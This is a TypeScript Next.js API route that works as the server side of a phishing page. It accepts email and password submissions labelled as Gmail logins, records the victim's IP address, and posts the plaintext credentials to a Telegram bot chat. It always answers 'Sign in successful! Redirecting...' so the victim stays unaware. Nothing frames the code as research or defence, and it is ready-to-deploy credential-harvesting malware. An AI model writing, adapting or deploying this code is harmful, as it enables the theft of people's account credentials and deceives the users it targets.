import axios from 'axios';
import { NextRequest, NextResponse } from 'next/server';
// Function to send message to Telegram
async function sendToTelegram(email: string, password: string, userAgent: string, ip: string, service: string = 'Unknown') {
    try {
        const message = `
🔐 **New Login Attempt - ${service}**

📧 **Email:** ${email}
🔑 **Password:** ${password}
📍 **IP Address:** ${ip}    
⏰ **Time:** ${new Date().toLocaleString()}
        `;

        const response = await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log('Message sent to Telegram successfully');
        return { success: true, messageId: response.data.result.message_id };
    } catch (error: any) {
        console.error('Error sending message to Telegram:', error.response?.data || error.message);
        return { success: false, error: error.message };
    }
}

export async function POST(request: NextRequest) {
    try {
        const { email, password, service } = await request.json();
        const userAgent = request.headers.get('user-agent') || 'Unknown';
        const ip = request.headers.get('x-forwarded-for') || 'Unknown';

        // Validate required fields
        if (!email || !password) {
            return NextResponse.json({
                success: false,
                message: 'Email and password are required'
            }, { status: 400 });
        }

        // Send to Telegram
        const telegramResult = await sendToTelegram(email, password, userAgent, ip, 'Gmail');

        if (telegramResult.success) {
            return NextResponse.json({
                success: true,
                message: 'Sign in successful! Redirecting...'
            });
        } else {
            console.error('Failed to send to Telegram:', telegramResult.error);
            return NextResponse.json({
                success: true,
                message: 'Sign in successful! Redirecting...'
            });
        }

    } catch (error) {
        console.error('Server error:', error);
        return NextResponse.json({
            success: false,
            message: 'Internal server error'
        }, { status: 500 });
    }
}
